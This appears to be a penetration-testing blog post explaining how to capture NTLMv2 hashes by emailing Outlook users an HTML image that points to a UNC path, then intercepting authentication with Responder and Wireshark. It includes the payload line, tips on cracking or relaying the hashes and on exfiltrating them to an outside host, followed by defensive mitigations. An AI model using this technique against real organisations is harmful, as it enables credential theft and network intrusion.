---
title:  "Getting that first Foothold - Stealing NTLMv2 hashes with ease"
header:
  teaser: "/assets/images/ntlmb2_captured.png"
categories:
  - NTLMv2 hashes
tags:
  - NTLMv2
  - hashes
  - Responder
  - Outlook
  - foothold
  - smb
  - llmnr
  - mdns
  - nbns
---

Well it's already been a month since my last post, and that's just way to long.  Time gets ahead of me these days, especially being as interested in so many areas of Infosec as I am.  Today I want to discuss a tried and true method of securing that first potential foothold on the target network for your pentest campaign.  Does this always work?  Absolutely not. However, you had better believe if certain items are in order it's highly probable you can carry this out undetected and with a few NTLMv2 hashes under your belt.

First things first, I don't want to explain what an NTLMv2 hash is.  There are copius amounts of information on the web and of course ChatGPT can elaborate even more on the specifics of the authentication challenge-response based protocol.

We are going to focus more on the actual attack methodology behind stealing these lovely hashes.  Let's start with some assumptions.  You will need at least ONE of these conditions to be true for this to work:

- Your target user base is using the Desktop Outlook client
- You know some user's company email addresses
- You are physically present, as in on the premises. OR... you are on the network via VPN, positioned in such a way that your attacker PC is on the same VLAN as the target PCs VLAN
- The target network firewall does NOT block ALL outbound ports 445, 139, 5353, and 5355 (Not entirely necessary for this write-up but just keep this in mind for later) 😺

***Stage 1 - Setup***
-

So, here's how it begins.  You will want to install this extention for Google Chrome to follow along on this particular route to get your coveted NTLMv2 hash:
[Insert HTML by Designmodo Chrome Extension](https://chrome.google.com/webstore/detail/insert-html-by-designmodo/bcflbfdlpegakpncdgmejelcolhmfkjh)

Also be sure to have **Wireshark** installed too.  In the event you are **on-site** or using **VPN**, I'd like to show you what you can see when this attack is carried out.  That will come a little later in the writeup.

Once you have both **Wireshark** and **Designmodo** installed, go to your gmail account (I'm assuming you have that too 😸 ) and create a new email message

Click on this envelope icon in the bottom, next to the big blue **Send** button: ![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/f5ad0661-b401-4ee3-a5cc-b1f08d507562)

Next, type in the fake UNC path to your non-existent image: <img src="file://///silent/but/deadly.png">
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/2632b2b7-e303-45cf-ba05-ad72a29e2a1d)

Then, Choose `Insert HTML`
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/e38ace21-9cc9-40ea-859b-16e8943db708)

The body of your email message should have a broken image inside it, like so:
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/be4c948d-2b75-4142-bff4-1c2531364bd1)

Okay, we're almost ready to send this now.  But before we do, I want you to know that the user does not even have to fully open the email for this to work.  They only merely have to **Preview** it in **Outlook** and this works immediately!

- Go ahead and fire up **Wireshark**, select your sniffing interface, and start listening for traffic...if you are on-site or using VPN and on the same VLAN as the customer user base.

- Also, we will need to load a tool called Responder which can intercept LLMNR, NBNS, and MDNS traffic.  This needs to run on the same network as the victim.

  Here's the link to the tool: [Responder for Linux](https://github.com/lgandx/Responder.git)

- Finally, you can now send that email to your target's email address and we will move on to phase 2 of the attack!

***Stage 2 - Infiltration***
-

When your email arrives, the target user will see what is captured in the below image.  Be sure to name the uncpath something realistic as they will be able to see this in the email preview:
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/a53ba76c-73cd-4755-9b46-ceb64d955cbf)

On your Linux Box, you should see a captured NTLMv2 hash assuming the user interacts with your email!  Here's what mine looks like.  Keep in mind I already captured this hash so it shows a different message but trust me, it worked:
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/ae4ed132-5e3c-4a2e-b2c4-c16681c02db1)

And Wireshark...

Do a Control + F and type in `silent` or whatever word you used in your UNC filepath:
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/5b85d79d-d9a6-4931-869b-eb8e6be80e81)

You can see your exact packet contents after the target user interacted with your email.  I say interacted...remember, they don't even need to fully open it, as in double clicking on it.  Just previewing it is enough

From here, you can crack the password using hashcat or relay it to another computer, the skies the limit!  

***Addendum***
-

You can also send the hash outside of the target company network to a device you control on an entirely different ISP, AWS, Azure, etc.  This would mean you don't have to be on-premesis at all.  HOWEVER, the company firewall MUST ALLOW the ports for these protocols outbound for you to receive the hash.

I don't have time to demo this today, but I can show you sometime if I get enough people asking for a demonstration.  😸

***Lessons Learned***
-

I tried blocking all images in Outlook and this attack still works.  I'm shocked actually.  Given the right circumstances, this is quite trivial to carry out.  Long story short:

- Disable Legacy protocols such as LLMNR, NBNS, AND MDNS.
- Use the highest available SMB/NTLM security offering.  Such as this one:** Send NTLMv2 responses only. Refuse LM & NTLM**
- Block the corresponding ports for LLMNR, NBNS, and MDNS outbound on your firewall
- Figure out how to make Outlook Desktop client better or turn off email previews 😕

  Know of other ways to combat this attack?  Feel free to comment below or hit me up on X!
  thanks everyone!

**-R.B.C.**
